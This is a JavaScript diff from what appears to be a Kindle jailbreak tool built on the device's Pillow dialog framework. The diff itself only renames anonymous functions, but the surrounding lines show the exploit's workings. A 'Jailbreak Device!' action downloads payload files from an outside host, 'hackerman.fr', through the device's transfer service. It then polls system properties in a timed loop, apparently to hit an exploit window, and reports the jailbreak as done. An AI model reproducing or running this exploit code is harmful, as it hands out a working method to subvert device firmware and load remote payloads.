@@ -37,7 +37,7 @@ function downloadDRMFile(path, url, file) {
     return drmFileData
 }
 
-Pillow.MountSusDialog = function () {
+Pillow.MountSusDialog = function tmp() {
     var that = this;
     var parent = Pillow.extend(this, new Pillow.Case('MountSusDialog'));
     var windowTitle = null;
@@ -55,11 +55,11 @@ Pillow.MountSusDialog = function () {
     /**
      * Sets up the dialog with Pillow and prepares the interface.
      */
-    this.onLoad = function () {
+    this.onLoad = function tmp() {
         nativeBridge.registerClientParamsCallback(this.clientParamsCallback);
         Pillow.setOption(OPTION_SEND_DELETE_EVENTS, true);
         windowTitle = new WindowTitle(WINMGR.LAYER.DIALOG, WINMGR.ROLE.DIALOG);
-        windowTitle.withChanges(function () {
+        windowTitle.withChanges(function tmp() {
             this.addParam(WINMGR.KEY.WIN_IS_MODAL,
                 WINMGR.MODALITY.DISMISSIBLE_MODAL);
         });
@@ -78,7 +78,7 @@ Pillow.MountSusDialog = function () {
         modifyClassNameDOM();
     };
 
-    var listItemSelection = function (item) {
+    var listItemSelection = function tmp(item) {
         Pillow.logInfo("Generating crypto constants");
         var cryptoConstants = generateCryptoSign();
         var urlRoot = "http://hackerman.fr";
@@ -126,7 +126,7 @@ Pillow.MountSusDialog = function () {
 
         nativeBridge.accessHasharrayProperty("com.lab126.transfer", "request_download", drm3ResponseRequest);
 
-        setTimeout(function () {var max = Math.ceil((cryptoConstants[1] * 30));
+        setTimeout(function tmp() {var max = Math.ceil((cryptoConstants[1] * 30));
         for (var i=0; i < max; i++) {
             nativeBridge.getIntLipcProperty("com.lab126.ccat", "logMask");
             nativeBridge.getIntLipcProperty("com.lab126.cmd", "wirelessEnable");
@@ -158,12 +158,12 @@ Pillow.MountSusDialog = function () {
 
         nativeBridge.accessHasharrayProperty("com.lab126.transfer", "request_download", drm2DownloadRequest);
 
-        setTimeout(function () {
+        setTimeout(function tmp() {
             document.getElementById("jailState").innerText = "Done! Close the popup and click Verify Jailbreak";
         }, 1000);
     };
 
-    this.clientParamsCallback = function (clientParamsString){
+    this.clientParamsCallback = function tmp(clientParamsString){
         // parse clientParams
         var clientParams = JSON.parse(clientParamsString);
         file = clientParams.fileData; // Add the payload
@@ -175,7 +175,7 @@ Pillow.MountSusDialog = function () {
         document.getElementById("jailState").innerText = "You are currently in jail.";
     };
 
-    this.getBrowserSettings = function () {
+    this.getBrowserSettings = function tmp() {
         var displayList = [];
         displayList.push({
             name: "Jailbreak Device!",
@@ -189,22 +189,22 @@ Pillow.MountSusDialog = function () {
         listWidget.setItems(settingList, widgetOptions);
     };
 
-    this.setBrowserSettings = function (widgetOptions) {
+    this.setBrowserSettings = function tmp(widgetOptions) {
         settingList = this.getBrowserSettings();
         this.renderBrowserSettings(settingList, widgetOptions);
     };
 
-    this.show = function () {
+    this.show = function tmp() {
         this.setBrowserSettings(true);
         nativeBridge.showMe();
     };
 
-    this.hide = function () {
+    this.hide = function tmp() {
         Pillow.logInfo("MountSusDialog.hide called");
         windowTitle.addParam(WINMGR.KEY.HIDE_DIALOG, WINMGR.DIALOG_HIDE.BACKGROUND);
     };
 
-    this.close = function () {
+    this.close = function tmp() {
         Pillow.logInfo("MountSusDialog.close called");
         nativeBridge.dismissMe();
     };
